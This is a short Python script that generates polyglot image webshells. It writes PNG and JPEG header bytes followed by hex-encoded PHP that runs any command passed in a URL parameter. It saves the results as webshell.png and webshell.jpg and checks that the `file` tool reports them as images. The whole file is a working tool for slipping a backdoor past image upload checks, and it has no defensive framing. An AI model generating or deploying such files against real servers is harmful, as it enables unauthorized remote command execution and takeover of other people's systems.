import binascii
import subprocess

#png webshell
png_hex_string = "89504E470D0A1A0A3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"  # PNG payload rawbytes
decoded_string = binascii.unhexlify(png_hex_string)
#"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
with open("webshell.png", "wb") as binary_file:
    # Write bytes to file
    binary_file.write(decoded_string)
    
subprocess.run(["xxd", "webshell.png"])
subprocess.run(["file", "webshell.png"])



#jpg webshell
#short payload =>3c3f3d60245f4745545b305d603f3e <?=`$_GET[0]`?>
#jpg_hex_string = "ffd8ffe03c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"  # jpg payload rawbytes
#jpg_hex_string = "ffd8ff3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"  # jpg payload rawbytes
jpg_hex_string = "ffd8ff3c3f3d60245f4745545b305d603f3e"  # jpg payload rawbytes
decoded_string = binascii.unhexlify(jpg_hex_string)

with open("webshell.jpg", "wb") as binary_file:
    # Write bytes to file
    binary_file.write(decoded_string)
    
subprocess.run(["xxd", "webshell.jpg"])
subprocess.run(["file", "webshell.jpg"])